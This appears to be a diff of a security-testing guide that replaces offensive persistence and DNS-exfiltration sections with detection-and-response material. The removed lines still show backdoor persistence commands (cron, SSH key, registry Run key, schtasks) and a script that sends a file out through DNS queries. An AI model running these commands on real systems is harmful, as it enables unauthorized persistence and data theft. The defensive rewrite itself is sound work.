@@ -51,8 +51,8 @@
 
 17. [Privilege Escalation](#privilege-escalation)
 18. [Lateral Movement](#lateral-movement)
-19. [Persistence Mechanisms](#persistence-mechanisms)
-20. [Data Exfiltration](#data-exfiltration-via-dns)
+19. [Persistence Mechanisms](#persistence-mechanisms-detection-and-response)
+20. [Data Exfiltration](#dns-data-exfiltration-detection)
 21. [C2 Frameworks & Tradecraft](Tradecraft/c2-frameworks.md)
 22. [AV/EDR Evasion - Detection & Defense](Tradecraft/av-edr-evasion.md)
 23. [Living Off the Land (LOLBins/LOLBAs)](Tradecraft/lolbins-lolbas.md)
@@ -895,55 +895,54 @@ winpeas.exe
 
 ---
 
-## Persistence Mechanisms
+## Persistence Mechanisms: Detection and Response
 
-### Linux Persistence
-```bash
-# Cron job
-(crontab -l; echo "* * * * * /tmp/backdoor.sh") | crontab -
+Persistence is a technique defenders should be able to identify and remove. The table below describes common evidence sources; it does not create or install persistence.
 
-# SSH keys
-echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
+| Platform | Review evidence | Defensive response |
+|---|---|---|
+| Linux scheduled tasks | `crontab -l`, `/etc/crontab`, `/etc/cron.*`, audit/package records | Compare with approved baselines; preserve suspicious files and timestamps before containment; remove only through incident procedure |
+| Linux services | `systemctl list-unit-files`, unit-file ownership and modification times | Validate package and change records; inspect service configuration and referenced binaries; disable/remove only after evidence capture |
+| SSH access | `authorized_keys` ownership, change history, and authentication logs | Confirm each key with its owner; revoke unknown keys and rotate affected credentials |
+| Windows logon entries | Autoruns inventory, registry change auditing, endpoint telemetry | Verify signer, path, change ticket and owner; isolate and investigate unexpected entries |
+| Scheduled tasks | Task Scheduler operational logs, task XML, creator identity and process telemetry | Compare task actions and principals with approved baselines; preserve task metadata before remediation |
+| WMI subscriptions | WMI-Activity logs, namespace inventory, endpoint telemetry | Inspect filter/consumer bindings and provenance; remove unauthorized objects after evidence collection |
 
-# Systemd service
-# Create malicious service file
+```mermaid
+flowchart LR
+    A[Inventory startup locations] --> B[Compare with approved baseline]
+    B --> C{Unexpected entry?}
+    C -- No --> D[Record review and retain evidence]
+    C -- Yes --> E[Preserve metadata and related logs]
+    E --> F[Contain affected host under IR plan]
+    F --> G[Remove persistence and verify clean state]
 ```
 
-### Windows Persistence
-```bash
-# Registry run keys
-reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\backdoor.exe"
-
-# Scheduled task
-schtasks /create /tn "Update" /tr "C:\backdoor.exe" /sc onlogon
-
-# WMI event subscription
-# Create malicious WMI filter and consumer
-```
----
-> 📁 **Deep Dive:** [LOLBins Persistence](Tradecraft/lolbins-lolbas.md#persistence-via-lolbins)
-> covers `schtasks`, registry Run keys, and WMI event subscription persistence
-> with Sigma detection rules and ASR hardening.
+Do not use commands that create a backdoor, scheduled task, registry autorun, service, or WMI consumer as a demonstration. For a lab, use a prebuilt disposable image with instructor-controlled artifacts and observe the resulting telemetry.
 
 [Return to Table of Contents](#master-table-of-contents)
 
 ---
 
-## Data Exfiltration via DNS
+## DNS Data-Exfiltration Detection
 
-```bash
-#!/bin/bash
-# DNS exfiltration script
+DNS logs can help identify covert data transfer, but a single long or unusual query is not proof of exfiltration. Investigate patterns across source host, resolver, domain, time, and endpoint telemetry.
 
-FILE=$1
-DOMAIN=$2
+**Review signals:** unusually long or high-entropy labels, repeated queries to a rare domain, many unique subdomains from one host, encoded-looking label sequences, and unexplained volume or regular timing. Check whether the domain belongs to approved software, security products, or a known CDN before escalating.
 
-base64 $FILE | fold -w 32 | while read chunk; do
-    nslookup "$chunk.$DOMAIN" 8.8.8.8 > /dev/null 2>&1
-    echo "[*] Sent chunk: ${chunk:0:10}..."
-    sleep 0.5
-done
+```mermaid
+flowchart LR
+    A[Endpoint] -->|DNS request| B[Managed resolver]
+    B --> C[DNS query logs]
+    C --> D[Normalize host domain time and response]
+    D --> E[Baseline against approved services]
+    E --> F{Repeated unusual labels or volume?}
+    F -- No --> G[Close with documented rationale]
+    F -- Yes --> H[Correlate endpoint process and network events]
+    H --> I[Preserve evidence and follow incident response]
 ```
+
+In an isolated training exercise, use synthetic DNS log rows rather than sending encoded file content to a resolver. Record the query, process, user, destination domain, response and time window; do not use public DNS infrastructure to test data-transfer behavior.
 
 [Return to Table of Contents](#master-table-of-contents)
 
@@ -1385,10 +1384,16 @@ defensive hardening guidance.
 ### Analysis Environment Quick Reference
  
 **Windows (FLARE VM)**
+
+> FLARE VM's upstream installer currently requires an Unrestricted execution policy. Apply its documented setup only in a fresh, disposable analysis VM; record and restore the pre-install policy during cleanup. Do not weaken policy on a personal or production workstation. See the [official FLARE VM setup guide](https://github.com/mandiant/flare-vm#installation).
+
 ```powershell
 # Install FLARE VM on clean Windows 10/11 VM
 # https://github.com/mandiant/flare-vm
-Set-ExecutionPolicy Unrestricted -Force
+# FLARE VM's current installer documents an Unrestricted execution-policy prerequisite.
+# Use only inside a fresh, disposable malware-analysis VM. Record the existing policy,
+# follow the official project setup steps, then restore the policy as part of VM cleanup.
+# Do not apply this setting on a personal or production workstation.
 .\install.ps1
 # Installs: x64dbg, Ghidra, PE-bear, CFF Explorer, Procmon, Process Hacker,
 #           Regshot, FakeNet-NG, CyberChef, dnSpy, de4dot, Wireshark
